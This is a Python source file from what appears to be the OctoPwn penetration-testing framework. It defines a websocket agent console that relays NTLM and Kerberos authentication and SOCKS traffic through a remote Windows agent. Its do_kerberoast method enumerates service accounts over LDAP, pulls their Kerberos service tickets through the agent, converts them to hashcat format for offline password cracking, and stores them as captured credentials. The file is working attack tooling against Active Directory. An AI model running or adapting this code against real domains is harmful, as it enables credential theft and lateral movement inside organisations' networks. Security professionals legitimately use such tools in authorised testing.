import asyncio
import os
import pprint
from typing import Dict

from aiosmb import logger
from octopwn.clients.scannerbase import ScannerConsoleBase
from octopwn.servers.wsnetws.authproxy import AuthProxy, AuthProxyNTLMClient, AuthProxyKerberosClient
from octopwn.servers.wsnetws.socksproxy import WSNETSocksProxy
from octopwn.servers.wsnetws.protocol import *
from minikerberos.common.spn import KerberosSPN
from octopwn.common.credential import Credential
from octopwn.remote.protocol.python import kerberos_pb2
from minikerberos.protocol.asn1_structs import AP_REQ
from asyauth.common.winapi.token import InitialContextToken
from minikerberos.common.utils import TGSTicket2hashcat
from asyauth.common.credentials import UniCredential
from asyauth.common.constants import asyauthSecret, asyauthProtocol, asyauthSubProtocol


class WSNETWSAgent(ScannerConsoleBase):
	def __init__(self, client_id, connection, cmd_q, msg_queue, prompt, octopwnobj):
		ScannerConsoleBase.__init__(self, client_id, connection, cmd_q, msg_queue, prompt, octopwnobj)
		self.nologon_commands.append('any')
		self.params = {}
		self.agentid = connection[0]
		self.ws = connection[1]
		self.agentinfo = connection[2]
		self.closed_evt = asyncio.Event()
		self.__agent_reader_task = None
		self.token_table:Dict[bytes, asyncio.Queue] = {}

	def get_token(self):
		return os.urandom(16)

	async def start(self):
		self.__agent_reader_task = asyncio.create_task(self.__agent_reader())
		return True, None
	
	async def __agent_reader(self):
		try:
			async for data in self.ws:
				#await self.print('AGENT DATA IN: %s' % data)
				cmd = CMD.from_bytes(data)
				if cmd.token not in self.token_table:
					await self.print('Agent sent token whic is not in table! %s' % cmd.token)
					continue
				await self.token_table[cmd.token].put(cmd)

		except Exception as e:
			await self.print_exc(e, 'Agent connection error!')
		finally:
			self.closed_evt.set()
	
	def isint(self, x):
		try:
			x = int(x)
			return True
		except:
			return False

	async def do_info(self):
		await self.print(pprint.pformat(self.agentinfo.to_dict(), indent=4))

	async def do_applyinfo(self):
		"""Applies default realm and DC ip settings from agent"""
		try:
			infod = self.agentinfo.to_dict()
			#adding credential
			domain = infod.get('domain')
			username = infod.get('username')
			udomain = None
			if username is not None:
				if username.find('\\') is not None:
					udomain, username = username.split('\\', 1)
			if domain is None and udomain is not None:
				domain = udomain
			
			await self.octopwnobj.do_realm(domain)
			await self.octopwnobj.do_dcip(infod.get('logonserver', domain))
			if 'logonserver' in infod and infod['logonserver'] is not None:
				tid, targetobj, err = await self.octopwnobj.do_addtarget(infod['logonserver'])
				if err is not None:
					raise err
		except Exception as e:
			await self.print_exc(e)

	async def do_kerberoast(self, spn:str, to_print:bool = True, h_token:int = None):
		"""Kerberoast user"""
		try:
			results = []
			spns = []
			if self.isint(spn) is True:
				spn = int(spn)
				client_config, ldapclient = self.octopwnobj.clients[spn]
				if client_config.connection_type.upper().startswith('LDAP') is False:
					raise Exception('Selected client is not LDAP client!')
				
				if ldapclient.logon_ok is False:
					_, err = await ldapclient.do_login(to_print=False)
					if err is not None:
						raise err

				
				async for user, err in ldapclient.client.get_all_service_users():
					if err is not None:
						raise err
				
					credential = KerberosSPN()
					credential.username = user.sAMAccountName
					credential.domain = ldapclient.domain_name

					spns.append(credential.get_formatted_pname())
					
			else:
				spns.append(spn)
			
			for spn in spns:
				ap, err = self.create_authproxy()
				status, ctxattr, authdata, err = await ap.authenticate('KERBEROS', "", spn, 3, 2048, b'')
				if err is not None:
					raise err
				token = InitialContextToken.load(authdata)
				ticket = AP_REQ(token.native['innerContextToken'])
				results.append(TGSTicket2hashcat(ticket.native))
			
							
			for result in results:
				if to_print is True:
					await self.print(result)
				
				username = ''
				domain = ''
				try:
					username = spn.split('@')[0]
					domain = spn.split('@')[1]
				except:
					pass

				cred = Credential(username, result, 'KERBEROAST', domain=domain, source='KERBEROAST-%s' % self.client_id, description='KERBEROAST')
				_, err = await self.octopwnobj.addcredential_obj(cred, to_print=False)
				if err is not None and to_print is True:
					await self.print('Failed to add kerberoast credential for user %s Reason: %s' % (username, err))
				
				if h_token is not None:
					msg = kerberos_pb2.KerberosKerberoast()
					msg.username = username
					msg.domain = domain
					msg.ticket = result
					await self.remotemsg(msg)
			
			await self.print('Done!')
			return results, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	def create_authproxy(self):
		try:
			token = self.get_token()
			in_q = asyncio.Queue()
			self.token_table[token] = in_q
			ap = AuthProxy(in_q, self.ws, token)
			return ap, None
		except Exception as e:
			return None, e

	def create_proxy(self):
		try:
			token = self.get_token()
			in_q = asyncio.Queue()
			self.token_table[token] = in_q
			ap = WSNETSocksProxy(in_q, self.ws, token, self.create_proxy)

			return ap, None
		except Exception as e:
			return None, e
	
	def build_context(self, credential:UniCredential):
		authproxy, err = self.create_authproxy()
		if err is not None:
			raise err
		if credential.protocol == asyauthProtocol.NTLM:
			return AuthProxyNTLMClient(authproxy, credential, self.build_context)
		elif credential.protocol == asyauthProtocol.KERBEROS:
			return AuthProxyKerberosClient(authproxy, credential, self.build_context)
		else:
			raise Exception('Unknown auth protocol %s' % credential.protocol)